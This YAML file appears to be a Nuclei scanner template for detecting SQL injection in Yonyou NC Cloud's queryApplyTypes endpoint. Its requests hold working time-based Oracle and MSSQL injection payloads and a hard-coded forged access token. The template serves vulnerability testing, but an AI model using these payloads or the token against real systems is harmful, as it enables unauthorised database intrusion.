id: yonyou-nc-cloud-queryapplytypes-sqli

info:
  name: 用友NC Cloud queryApplyTypes SQL注入
  author: SleepingBag945
  severity: high

http:
  - raw:
      - |
        GET /ncchr/busitrip/apply/queryApplyTypes?staffId=??'%20and%204431=dbms_pipe.receive_message(chr(83)||chr(104)||chr(82)||chr(70),5)-- HTTP/1.1
        Host: {{Hostname}}
        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ

      - |
        GET /ncchr/busitrip/apply/queryApplyTypes?staffId=11';WAITFOR%20DELAY'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
  

    stop-at-first-match: true
    matchers:
      - type: dsl
        condition: or
        dsl:
          - duration_1>=5  && duration_1<=7 && status_code_1==500 && contains(body_1,"NullPointerException")
          - duration_2>=5  && duration_2<=7 && status_code_2==500 && contains(body_2,"NullPointerException")
          